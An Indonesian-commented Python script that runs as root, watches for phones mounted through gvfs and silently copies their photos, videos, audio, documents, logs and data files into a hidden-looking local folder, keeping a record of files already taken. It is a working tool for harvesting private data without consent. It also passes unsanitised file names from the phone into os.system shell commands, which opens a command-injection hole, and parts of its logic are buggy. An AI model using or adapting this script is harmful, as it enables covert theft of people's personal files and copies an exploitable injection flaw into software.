"""
aplikasi untuk mengambil semua data penting dari hp yang terhubung ke komputer
"""

import os
import threading
import json

# menampung semua variable yang akan digunakan
class variable:
    dic_utama = "/run/user/0/gvfs"
    dic_tujuan = "/usr/rope_phone_data"
    list_phone_connect = []
    list_file = []
    list_rope_ektensi = ['jpg', 'jpeg', 'JPG', 'JPEG', 'log', 'LOG', 'txt', 'TXT', 'mp3', 'MP3', 'mp4', 'MP4', 'doc',
                         'docs', 'DOC', 'DOCS', 'csv', 'CSV', 'json', 'JSON']

# membuat fungsi untuk membuka semua folder yang ada didalam hp
def eksplore_folder(path, phone):
    # cek apakah phone store bisa diakses
    if len(os.listdir(path)) > 0:
        for folder in os.listdir(path):
            path_now = path + "/" + folder
            if os.path.isdir(path_now):
                threading.Thread(target=eksplore_folder, args=(path_now, phone)).start()
            else:
                # mengecek apakah file harus dicopy atau tidak
                file = path_now.split(".")
                file = file[len(file) - 1]
                if file in variable.list_rope_ektensi:
                    add = {
                        'phone': phone,
                        'path_asal': path_now,
                        'ektensi': file
                    }
                    variable.list_file.append(add)

# membuat fungsi untuk mengcopy semua data didalam hp
def rope_phone_data(phone):
    phone_name = variable.dic_utama + "/" + phone
    # membaca semua folder yang ada didalam hp
    eksplore_folder(phone_name, phone)

# fungsi untuk mengcopy file
def copy_file(path_asal, path_sub_ektensi, file):
    os.system("cp '" + path_asal + "' '" + path_sub_ektensi + "'")
    # menghapus file yang telah dicopy
    variable.list_file.remove(file)

# fungsi untuk mengcopy semua file yang ditemukan
def copy_all_file():
    while True:
        if len(variable.list_file) > 0:
            proses = 0
            thread = []
            for file in variable.list_file:
                eksekusi = file
                phone = variable.dic_tujuan + "/" + file['phone']
                path_asal = file['path_asal']
                ektensi = file['ektensi']

                # membaca daftar file yang pernah di simpan
                save_file_list = variable.dic_tujuan + "/save_file_list.json"
                if not os.path.exists(save_file_list):
                    file_open = open(save_file_list, 'w')
                    save_list = []
                    file_open.close()
                else:
                    file_open = open(save_file_list, 'r')
                    data = json.load(file_open)
                    save_list = data['list_file']
                    file_open.close()

                # cek apakah folder tujuan telah tersedia
                if not os.path.exists(phone):
                    os.mkdir(phone)

                # cek apakah ektensi folder telah tersedia
                path_ektensi = phone + "/" + ektensi
                if not os.path.exists(path_ektensi):
                    os.mkdir(path_ektensi)

                # cek apakah folder sub_ektensi telah ada
                sub_ektensi = path_asal.split("/")
                sub_ektensi = sub_ektensi[len(sub_ektensi) - 2]
                path_sub_ektensi = path_ektensi + "/" + sub_ektensi
                if not os.path.exists(path_sub_ektensi):
                    os.mkdir(path_sub_ektensi)

                # cek apakah file pernah dicopy
                if path_asal not in save_list:
                    # memulai mengcopy file
                    os.system("cp '" + path_asal + "' '" + path_sub_ektensi + "'")

                    # menghapus file yang telah dicopy
                    print(file)
                    variable.list_file.remove(file)

                    # memasukkan data kedalam database
                    save_list.append(path_asal)
                    save = {
                        'list_file': save_list
                    }

                    file_open = open(save_file_list, 'w')
                    json.dump(save, file_open)
                    file_open.close()

# melakukan perulangan untuk megecek apakah ada hp yang terhubung ke komputer
threading.Thread(target=copy_all_file).start()
while True:
    list_phone = os.listdir(variable.dic_utama)
    if len(list_phone) > 0 and not any(phone in list_phone for phone in variable.list_phone_connect):
        for phone in list_phone:
            print("eksekusi phone : " + phone)
            variable.list_phone_connect.append(phone)
            rope_phone_data(phone)
    elif len(list_phone) != len(variable.list_phone_connect):
        variable.list_phone_connect = list_phone
        if len(variable.list_phone_connect) == 0:
            print("Tidak ada hp yang terhubung")